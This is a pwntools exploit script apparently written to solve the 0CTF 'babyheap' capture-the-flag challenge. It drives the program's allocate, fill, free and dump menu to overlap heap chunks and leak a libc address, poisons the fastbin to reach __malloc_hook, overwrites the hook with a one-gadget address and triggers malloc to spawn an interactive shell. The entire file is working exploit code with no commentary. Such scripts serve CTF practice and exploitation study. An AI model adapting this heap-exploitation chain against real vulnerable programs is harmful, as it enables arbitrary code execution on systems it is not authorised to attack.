from pwn import *
gadgets=[0x4526a]
for gadget in gadgets:
	target=process('./0ctfbabyheap')
	elf=ELF('./0ctfbabyheap')
	libc=elf.libc

	def init(option):
		print(target.recvuntil("Command: "))
		target.sendline(str(option))

	def allocate(size):
		init(1)
		print(target.recvuntil("Size: "))
		target.sendline(str(size))
		print(target.recvline())

	def fill(index,size,content):
		init(2)
		print(target.recvuntil("Index: "))
		target.sendline(str(index))
		print(target.recvuntil("Size: "))
		target.sendline(str(size))
		print(target.recvuntil("Content: "))
		target.send(content)
		
	def free(index):
		init(3)	
		print(target.recvuntil("Index: "))
		target.sendline(str(index))
		
	def dump(index):
		init(4)
		print(target.recvuntil("Index: "))
		target.sendline(str(index))
		print(target.recvline())
		leak=target.recv(6)
		libc_leak=u64(leak+"\x00"*2)
		print(hex(libc_leak))
		return libc_leak

	allocate(0x10)#0
	allocate(0x500)#1
	allocate(0x500)#2
	allocate(0x500)#3
	allocate(0x10)#4
	free(1)
	fill(2,0x510,"A"*0x500+p64(0xa20)+p64(0x510))
	free(3)
	allocate(0x500)#1
	allocate(0x500)#3
	free(3)
	libc_leak=dump(2)
	libc_base=libc_leak-0x68-libc.symbols["__malloc_hook"]
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	print(hex(libc_leak))
	print(hex(libc_base))
	free(0)
	free(1)
	free(4)
	allocate(0x68)#0
	allocate(0x68)#1
	allocate(0x68)#3
	allocate(0x68)#4
	allocate(0x68)#5
	free(1)
	free(4)
	fill(3,0x78,"A"*0x60+p64(0)+p64(0x71)+p64(libc_malloc_hook-0x23))
	allocate(0x68)#1
	allocate(0x68)#4
	fill(4,0x23-8,"A"*0x13+p64(libc_gadget))
	init(1)
	print(target.recvuntil("Size: "))
	target.sendline(str(1))

	target.interactive()	
